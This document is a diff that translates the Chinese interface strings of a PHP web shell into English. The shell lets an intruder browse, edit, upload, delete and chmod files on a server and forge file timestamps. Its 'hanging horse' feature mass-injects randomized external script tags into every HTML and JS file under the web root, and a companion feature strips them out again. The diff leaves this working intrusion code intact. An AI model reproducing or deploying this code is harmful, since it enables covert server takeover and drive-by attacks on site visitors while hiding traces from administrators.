@@ -217,7 +217,7 @@ function File_Act($array,$actall,$inver)
 	{
 		$zip = new packdir;
 		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
-		return '打包所选文件失败';
+		return 'Failed to package selected file';
 	}
 	$i = 0;
 	while($i < $count)
@@ -225,14 +225,14 @@ function File_Act($array,$actall,$inver)
 		$array[$i] = urldecode($array[$i]);
 		switch($actall)
 		{
-			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
-			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
-			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
-			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
+			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return 'Path error'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = 'copy to'.$inver.'table of Contents'; break;
+			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'delete'; break;
+			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'Attribute value error'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = 'Modify the properties to'.$inver; break;
+			case "d" : @touch($array[$i],strtotime($inver)); $msg = 'Modified time is'.$inver; break;
 		}
 		$i++;
 	}
-	return '所选文件'.$msg.'完毕';
+	return 'Selected file'.$msg.'complete';
 }
 
 function File_Edit($filepath,$filename,$dim = '')
@@ -269,16 +269,16 @@ function CheckDate(){
 	var re = document.getElementById('mtime').value;
 	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
 	var r = re.match(reg);
-	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
+	if(r==null){alert('Date format is incorrect! Format:yyyy-mm-dd hh:mm:ss');return false;}
 	else{document.getElementById('editor').submit();}
 }
 </script>
-<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
+<div class="actall">Find content: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
 <input type="button" value="查找" onclick="search(searchs.value)"></div>
 <form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
 <div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
 <div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
-<div class="actall">文件修改时间 <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
+<div class="actall">File modification time <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
 <div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;">
 <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
 </form>
@@ -289,7 +289,7 @@ function File_Soup($p)
 {
 	$THIS_DIR = urlencode($p);
 	$UP_SIZE = get_cfg_var('upload_max_filesize');
-	$MSG_BOX = '单个附件允许大小:'.$UP_SIZE.', 改名格式(new.php),如为空,则保持原文件名.';
+	$MSG_BOX = 'Allowed size of single attachment:'.$UP_SIZE.', Rename format(new.php),If empty,Keep the original file name.';
 	if(!empty($_POST['updir']))
 	{
 		if(count($_FILES['soup']) >= 1)
@@ -301,28 +301,28 @@ function File_Soup($p)
 				{
 					$souptmp = $_FILES['soup']['tmp_name'][$key];
 					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
-					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';
+					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'Upload successfully' : $soupname.'upload failed';
 				}
 				$i++;
 			}
 		}
 		else
 		{
-			$MSG_BOX = '请选择文件';
+			$MSG_BOX = 'Please select file';
 		}
 	}
 print<<<END
 <div class="msgbox">{$MSG_BOX}</div>
 <form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
-<div class="actall">上传到目录: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
-<div class="actall">附件1 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
-<div class="actall">附件2 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
-<div class="actall">附件3 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
-<div class="actall">附件4 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
-<div class="actall">附件5 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
-<div class="actall">附件6 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
-<div class="actall">附件7 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
-<div class="actall">附件8 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
+<div class="actall">Upload to catalog: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
+<div class="actall">attachment1 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
+<div class="actall">attachment2 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
+<div class="actall">attachment3 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
+<div class="actall">attachment4 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
+<div class="actall">attachment5 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
+<div class="actall">attachment6 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
+<div class="actall">attachment7 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
+<div class="actall">attachment8 <input type="file" name="soup[]" style="width:300px;height:22px;"> Renamed <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
 <div class="actall"><input type="submit" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
 </form>
 END;
@@ -331,7 +331,7 @@ END;
 function File_a($p)
 {
 	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
-	$MSG_BOX = '等待消息队列';
+	$MSG_BOX = 'Waiting message queue';
 	$UP_DIR = urlencode(File_Str($p.'/..'));
 	$REAL_DIR = File_Str(realpath($p));
 	$FILE_DIR = File_Str(dirname(__FILE__));
@@ -339,20 +339,23 @@ function File_a($p)
 	$THIS_DIR = urlencode(File_Str($REAL_DIR));
 	$NUM_D = 0;
 	$NUM_F = 0;
-	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}
-	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
+	if(!empty($_POST['pfn'])){
+		$intime = @strtotime($_POST['mtime']);
+		$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? 'Edit file '.$_POST['pfn'].' success' : 'Edit file '.$_POST['pfn'].' failed';@touch($_POST['pfn'],$intime);
+	}
+	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? 'upload files '.$upfilename.' success' : 'upload files '.$upfilename.' failed';}
 	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
-	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}
-	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
-	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
-	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
-	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}
+	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = 'Attribute value error'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? 'modify '.$modfile.' Attribute is '.$_GET['md'].' success' : 'modify '.$modfile.' Attribute is '.$_GET['md'].' failed';}
+	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? 'Renamed '.$_GET['mn'].' for '.$_GET['rn'].' success' : 'Renamed '.$_GET['mn'].' for '.$_GET['rn'].' failed';}
+	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? 'Create a directory '.$_GET['dn'].' success' : 'Create a directory '.$_GET['dn'].' failed';}
+	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'Delete directory '.$_GET['dd'].' success' : 'Delete directory '.$_GET['dd'].' failed';}
+	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'The download file does not exist';}
 	Root_CSS();
 print<<<END
 <script type="text/javascript">
 	function Inputok(msg,gourl)
 	{
-		smsg = "当前文件:[" + msg + "]";
+		smsg = "Current file:[" + msg + "]";
 		re = prompt(smsg,unescape(msg));
 		if(re)
 		{
@@ -362,7 +365,7 @@ print<<<END
 	}
 	function Delok(msg,gourl)
 	{
-		smsg = "确定要删除[" + unescape(msg) + "]吗?";
+		smsg = "Sure to delete[" + unescape(msg) + "]Is it?";
 		if(confirm(smsg))
 		{
 			if(gourl == 'b')
@@ -375,14 +378,14 @@ print<<<END
 	}
 	function CheckDate(msg,gourl)
 	{
-		smsg = "当前文件时间:[" + msg + "]";
+		smsg = "Current file time:[" + msg + "]";
 		re = prompt(smsg,msg);
 		if(re)
 		{
 			var url = gourl + re;
 			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
 			var r = re.match(reg);
-			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
+			if(r==null){alert('Date format is incorrect!format:yyyy-mm-dd hh:mm:ss');return false;}
 			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
 		}
 	}
@@ -411,31 +414,31 @@ print<<<END
 	<form method="GET"><input type="hidden" id="s" name="s" value="a">
 	<input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
 	<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
-	<option>---特殊目录---</option>
-	<option value="{$ROOT_DIR}"> 网站根目录 </option>
-	<option value="{$FILE_DIR}"> 本程序目录 </option>
-	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动"> 所有组启动项 </option>
-	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> 英文启动项 </option>
+	<option>---Special catalog---</option>
+	<option value="{$ROOT_DIR}"> Website root </option>
+	<option value="{$FILE_DIR}"> This program directory </option>
+	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> All group startup items </option>
+	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> English startup items </option>
 	<option value="C:/RECYCLER"> RECYCLER </option>
 	<option value="C:/Program Files"> Program Files </option>
-	</select> <input type="submit" value="转到" style="width:50px;"></form>
+	</select> <input type="submit" value="submit" style="width:50px;"></form>
 	<div style="margin-top:3px;"></div>
 	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
-	<input type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
-	<input type="button" value="新建目录" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
-	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
+	<input type="button" value="create a new file" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
+	<input type="button" value="New directory" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
+	<input type="button" value="Bulk upload" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
 	<input type="file" name="ufp" style="width:300px;height:22px;">
 	<input type="text" name="ufn" style="width:121px;height:22px;">
-	<input type="submit" value="上传" style="width:50px;">
+	<input type="submit" value="submit" style="width:50px;">
 	</form>
 	</div>
 	<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
 	<table border="0"><tr>
-	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>上级目录</b></a> </td>
-	<td class="toptd" style="width:80px;"> 操作 </td>
-	<td class="toptd" style="width:48px;"> 属性 </td>
-	<td class="toptd" style="width:173px;"> 修改时间 </td>
-	<td class="toptd" style="width:75px;"> 大小 </td></tr>
+	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>Parent directory</b></a> </td>
+	<td class="toptd" style="width:80px;"> operating </td>
+	<td class="toptd" style="width:48px;"> Attributes </td>
+	<td class="toptd" style="width:173px;"> Change the time </td>
+	<td class="toptd" style="width:75px;"> size </td></tr>
 END;
 	if(($h_d = @opendir($p)) == NULL) return false;
 	while(false !== ($Filename = @readdir($h_d)))
@@ -449,8 +452,8 @@ END;
 			$Filepath = urlencode($Filepath);
 			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
 			$Filename = urlencode($Filename);
-			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> 删除 </a> ';
-			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td> ';
+			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> delete </a> ';
+			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> Renamed </a> </td> ';
 			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
 			echo ' <td>'.$Filetime.'</td> ';
 			echo ' <td> </td> </tr>'."\r\n";
@@ -472,8 +475,8 @@ END;
 			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
 			$Filepath = urlencode($Filepath);
 			$Filename = urlencode($Filename);
-			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> 编辑 </a> ';
-			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td>';
+			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> edit </a> ';
+			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> Renamed </a> </td>';
 			echo ' <td>'.$Fileperm.'</td> ';
 			echo ' <td>'.$Filetime.'</td> ';
 			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
@@ -487,12 +490,12 @@ print<<<END
 <div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
 <input type="hidden" id="inver" name="inver" value="undefined"> 
 <input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
-<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$THIS_DIR}','a');return false;"> 
-<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
-<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
-<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
-<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','spider.tar.gz','e');return false;"> 
-目录({$NUM_D}) / 文件({$NUM_F})</div> 
+<input type="button" value="copy" onclick="SubmitUrl('Copy selected files to path: ','{$THIS_DIR}','a');return false;"> 
+<input type="button" value="delete" onclick="Delok('Selected file','b');return false;"> 
+<input type="button" value="Attributes" onclick="SubmitUrl('Modify the selected file attribute value: ','0666','c');return false;"> 
+<input type="button" value="time" onclick="CheckDate('{$Filetime}','d');return false;"> 
+<input type="button" value="Bale" onclick="SubmitUrl('Package and download the selected file: ','spider.tar.gz','e');return false;"> 
+table of Contents({$NUM_D}) / file({$NUM_F})</div> 
 </form> 
 END;
 	return true;
@@ -531,7 +534,7 @@ function Guama_Auto($gp,$gt,$gl,$gc,$gm,$gf,$gi,$gk,$gd,$gb)
 			if($gi == 'a'){if(!stristr($fc,'</head>')) continue; $fcm = str_replace('</head>',"\r\n".$gcm."\r\n".'</head>',$fc); $fcm = str_replace('</HEAD>',"\r\n".$gcm."\r\n".'</HEAD>',$fcm);}
 			if($gi == 'b') $fcm = $gcm."\r\n".$fc;
 			if($gi == 'c') $fcm = $fc."\r\n".$gcm;
-			echo File_Write($Filepath,$fcm,'wb') ? '<font color="#006600">成功:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">失败:</font>'.$Filepath.' <br>'."\r\n";
+			echo File_Write($Filepath,$fcm,'wb') ? '<font color="#006600">success:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">failed:</font>'.$Filepath.' <br>'."\r\n";
 			if($gd) @touch($Filepath,$ftime);
 			ob_flush();
 			flush();
@@ -553,7 +556,7 @@ function Guama_b()
 			$temp = explode('[-',$_POST['gc']);
 			$gk = $temp[0];
 			preg_match_all("/\[\-([^~]*?)\-\]/i",$_POST['gc'],$nc);
-			if(!eregi("^[0-9]{1,2}$",$nc[1][0])){echo '<a href="#" onclick="history.back();">异常终止</a>'; return false;}
+			if(!eregi("^[0-9]{1,2}$",$nc[1][0])){echo '<a href="#" onclick="history.back();">Abnormal termination</a>'; return false;}
 			$gm = (int)$nc[1][0];
 			$gf = $nc[0][0];
 		}
@@ -566,7 +569,7 @@ function Guama_b()
 		if(!isset($_POST['gx'])) $gk = '';
 		$gd = isset($_POST['gd']) ? true : false;
 		$gb = ($_POST['gb'] == 'a') ? true : false;
-		echo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href="#" onclick="history.back();">挂马完毕</a>' : '<a href="#" onclick="history.back();">异常终止</a>';
+		echo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href="#" onclick="history.back();">Hang up</a>' : '<a href="#" onclick="history.back();">Abnormal termination</a>';
 		echo '</div>';
 		return false;
 	}
@@ -584,38 +587,38 @@ function Fulll(i)
 }
 function autorun()
 {
-	if(document.getElementById('gp').value == ''){alert('挂马路径不能为空');return false;}
-	if(document.getElementById('gt').value == ''){alert('文件类型不能为空');return false;}
-	if(document.getElementById('gc').value == ''){alert('挂马代码不能为空');return false;}
+	if(document.getElementById('gp').value == ''){alert('Horse hanging path cannot be empty');return false;}
+	if(document.getElementById('gt').value == ''){alert('File type cannot be empty');return false;}
+	if(document.getElementById('gc').value == ''){alert('Trojan code cannot be empty');return false;}
 	document.getElementById('sform').submit();
 }
 </script>
 <form method="POST" name="sform" id="sform" action="?s=b">
-<div class="actall" style="height:35px;">挂马路径 <input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">Hanging horse path <input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fulll(options[selectedIndex].value)'>
-<option value="0" selected>--范围选择--</option>
-<option value="1">网站跟目录</option>
-<option value="2">本程序目录</option>
+<option value="0" selected>--Range selection--</option>
+<option value="1">Website and directory</option>
+<option value="2">This program directory</option>
 </select></div>
-<div class="actall" style="height:35px;">文件类型 <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">file type <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fulll(options[selectedIndex].value)'>
-<option value="0" selected>--类型选择--</option>
-<option value="3">静态文件</option>
-<option value="4">脚本静态</option>
-<option value="5">JS文件</option>
+<option value="0" selected>--Type selection--</option>
+<option value="3">Static file</option>
+<option value="4">Script static</option>
+<option value="5">JS file</option>
 </select></div>
-<div class="actall" style="height:35px;">过滤对象 <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
-<input type="radio" name="inout" value="a" onclick="gl.disabled=false;">开启 <input type="radio" name="inout" value="b" onclick="gl.disabled=true;" checked>关闭</div>
-<div class="actall">挂马代码 <textarea name="gc" id="gc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js?[-6-]"&gt;&lt;/script&gt;</textarea>
-<div class="msgbox">挂马变形说明: 程序自动寻找[-6-]标签,替换为随机字符,6表示六位随机字符,最大12位,如果不变形可以不加[-6-]标签.
-<br>挂上示例: &lt;script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
-<div class="actall" style="height:35px;"><input type="radio" name="gi" value="a" checked>插入&lt;/head&gt;标签之前 
-<input type="radio" name="gi" value="b">插入文件最顶端 
-<input type="radio" name="gi" value="c">插入文件最末尾</div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>智能过滤重复代码 <input type="checkbox" name="gd" value="1" checked>保持文件修改时间不变</div>
-<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>将挂马应用于该文件夹,子文件夹和文件
-<br><input type="radio" name="gb" value="b">仅将挂马应用于该文件夹</div>
-<div class="actall"><input type="button" value="开始挂马" style="width:80px;height:26px;" onclick="autorun();"></div>
+<div class="actall" style="height:35px;">Filter object <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
+<input type="radio" name="inout" value="a" onclick="gl.disabled=false;">Turn on <input type="radio" name="inout" value="b" onclick="gl.disabled=true;" checked>shut down</div>
+<div class="actall">Hanging horse code <textarea name="gc" id="gc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js?[-6-]"&gt;&lt;/script&gt;</textarea>
+<div class="msgbox">Description of the deformation of the hanging horse: Automatic search[-6-]label,Replace with random characters,6 means six random characters,Up to 12,If it is not deformed, it can be omitted[-6-]label.
+<br>Hang up example: &lt;script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
+<div class="actall" style="height:35px;"><input type="radio" name="gi" value="a" checked>insert&lt;/head&gt;Before label 
+<input type="radio" name="gi" value="b">Insert the top of the file 
+<input type="radio" name="gi" value="c">Insert at the end of the file</div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>Intelligent filtering of duplicate codes <input type="checkbox" name="gd" value="1" checked>Keep the file modification time unchanged</div>
+<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>Apply the hanging horse to this folder,Subfolders and files
+<br><input type="radio" name="gb" value="b">Only apply the hanging horse to this folder</div>
+<div class="actall"><input type="button" value="start" style="width:80px;height:26px;" onclick="autorun();"></div>
 </form>
 END;
 return true;
@@ -637,7 +640,7 @@ function Qingma_Auto($qp,$qt,$qc,$qd,$qb)
 			if(!stristr($ic,$qc)) continue;
 			$ic = str_replace($qc,'',$ic);
 			if($qd) $ftime = @filemtime($Filepath);
-			echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">成功:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">失败:</font>'.$Filepath.' <br>'."\r\n";
+			echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">success:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">failure:</font>'.$Filepath.' <br>'."\r\n";
 			if($qd) @touch($Filepath,$ftime);
 			ob_flush();
 			flush();
@@ -655,7 +658,7 @@ function Qingma_c()
 		$qt = str_replace('.','\\.',$_POST['qt']);
 		$qd = isset($_POST['qd']) ? true : false;
 		$qb = ($_POST['qb'] == 'a') ? true : false;
-		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href="#" onclick="history.back();">清马完毕</a>' : '<a href="#" onclick="history.back();">异常终止</a>';
+		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href="#" onclick="history.back();">Finish cleaning</a>' : '<a href="#" onclick="history.back();">Abnormal termination</a>';
 		echo '</div>';
 		return false;
 	}
@@ -671,31 +674,31 @@ function Fullll(i){
   return true;
 }
 function autoup(){
-	if(document.getElementById('qp').value == ''){alert('清马路径不能为空');return false;}
-	if(document.getElementById('qt').value == ''){alert('文件类型不能为空');return false;}
-	if(document.getElementById('qc').value == ''){alert('清除代码不能为空');return false;}
+	if(document.getElementById('qp').value == ''){alert('The clearing path cannot be empty');return false;}
+	if(document.getElementById('qt').value == ''){alert('File type cannot be empty');return false;}
+	if(document.getElementById('qc').value == ''){alert('Clear code cannot be empty');return false;}
 	document.getElementById('xform').submit();
 }
 </script>
 <form method="POST" name="xform" id="xform" action="?s=c">
-<div class="actall" style="height:35px;">清马路径 <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">Qingma Path <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fullll(options[selectedIndex].value)'>
-<option value="0" selected>--范围选择--</option>
-<option value="1">网站跟目录</option>
-<option value="2">本程序目录</option>
+<option value="0" selected>--Range selection--</option>
+<option value="1">Website and directory</option>
+<option value="2">This program directory</option>
 </select></div>
-<div class="actall" style="height:35px;">文件类型 <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">file type <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fullll(options[selectedIndex].value)'>
-<option value="0" selected>--类型选择--</option>
-<option value="3">静态文件</option>
-<option value="4">脚本+静态</option>
-<option value="5">JS文件</option>
+<option value="0" selected>--Type selection--</option>
+<option value="3">Static file</option>
+<option value="4">script+静态</option>
+<option value="5">JS file</option>
 </select></div>
-<div class="actall">清除代码 <textarea name="qc" id="qc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js"&gt;&lt;/script&gt;</textarea></div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>保持文件修改时间不变</div>
